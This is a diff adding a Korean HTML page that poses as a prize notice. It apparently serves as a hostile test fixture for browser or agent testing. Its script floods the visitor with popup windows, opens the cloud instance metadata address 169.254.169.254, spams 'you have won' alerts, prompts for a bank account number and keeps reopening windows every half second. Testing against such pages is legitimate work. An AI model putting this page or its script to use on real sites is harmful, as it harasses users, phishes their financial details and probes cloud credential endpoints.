@@ -1,0 +1,10 @@
+<!doctype html><html lang="ko"><meta charset="utf-8"><title>창 폭탄</title><link rel="stylesheet" href="/_style.css">
+<h1>당첨 안내</h1><p>여러 창이 열리고 경고가 계속 뜬다.</p>
+<p><a class="btn" href="/benign/notice.html">당첨 확인</a></p>
+<script>
+for (var i = 0; i < 20; i++) { window.open('/benign/notice.html?w=' + i); }
+window.open('http://169.254.169.254/latest/meta-data/');
+for (var j = 0; j < 5; j++) { alert('당첨되었습니다 ' + j); }
+prompt('계좌번호를 입력하세요');
+setInterval(function () { window.open('/benign/notice.html?again=' + Date.now()); }, 500);
+</script></html>
